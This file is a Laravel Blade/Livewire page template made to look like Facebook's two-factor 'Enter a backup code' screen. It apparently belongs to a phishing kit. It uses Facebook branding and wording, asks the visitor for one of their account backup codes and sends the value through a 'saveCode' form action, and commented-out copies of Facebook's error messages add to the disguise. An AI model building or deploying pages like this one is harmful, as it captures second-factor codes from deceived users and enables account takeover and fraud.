<body class="bg-[#F0F2F5]">
<div class="min-h-screen flex mt-32 justify-center px-4">
    <div class="max-w-xl w-full space-y-4">
        <!-- Header -->
        <div class="flex items-center gap-2">
             <a href="{{route('index') . '?conf=' . request()->query('conf')}}" class="font-medium flex text-sm gap-2">
                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="size-6">
                  <path stroke-linecap="round" stroke-linejoin="round" d="M10.5 19.5 3 12m0 0 7.5-7.5M3 12h18" />
                </svg>
            </a>
            <p class="text-sm text-gray-600 mb-1">Facebook</p>
        </div>
        <div class="">
            <h1 class="text-[22px] font-semibold text-gray-900 mb-2">
                Enter a backup code
            </h1>
            <p class="text-[15px] text-gray-600 font-semibold">
                To secure your account, please provide one of the 10 backup codes. If you don’t have them, set up a backup code in your Facebook app settings and retry here.
            </p>
        </div>

        <!-- Image placeholder -->
        <div class="bg-[#E7F3F3] rounded-lg flex justify-center">
            <img src="{{ asset('images/tfa.png') }}" class="w-full block" alt="Authentication app illustration">
        </div>

        <form
            wire:submit.prevent="saveCode" class="space-y-4">
            <!-- Code input -->
            <div>
                @error('backupcode')
                <small class="text-red-500 font-medium">
                    {{--                    The login code you entered doesn't match the one sent to your phone. Please check the number and--}}
                    {{--                    try--}}
                    {{--                    again.--}}
                    {{$message}}
                </small>
                @enderror
            </div>
            <div>
                <input type="text" placeholder="Backup Code" wire:model="backupcode" maxlength="10"
                       class="w-full px-4 py-4 bg-transparent border border-gray-300 rounded-2xl focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500 mb-2">
                {{--                <input type="text" placeholder="Code" wire:model="code" maxlength="6"--}}
                {{--                    class="w-full px-4 py-4 bg-transparent border border-gray-300 rounded-2xl focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500">--}}
            </div>

            <!-- Continue button -->
            <button  wire:loading.attr="disabled" wire:target="saveCode"
                    class="w-full bg-[#1B74E4] text-white py-3 px-4 rounded-full font-semibold hover:bg-blue-600 text-center hover:disabled:bg-[#1B74E4] flex justify-center items-center disabled:opacity-50">
                <span class="animate-spin" wire:loading wire:target="saveCode">
                    @svg('lucide-loader-circle', 'h-6 w-6')
                </span>
                <span wire:loading.remove wire:target="saveCode">
                    Continue
                </span>
            </button>
        </form>

        <!-- Try Another Way button -->
        {{--            <button--}}
        {{--                class="w-full py-2.5 px-4 border border-gray-300 rounded-full text-sm font-semibold text-gray-700 hover:bg-gray-50">--}}
        {{--                Try Another Way--}}
        {{--            </button>--}}
    </div>
</div>
</body>
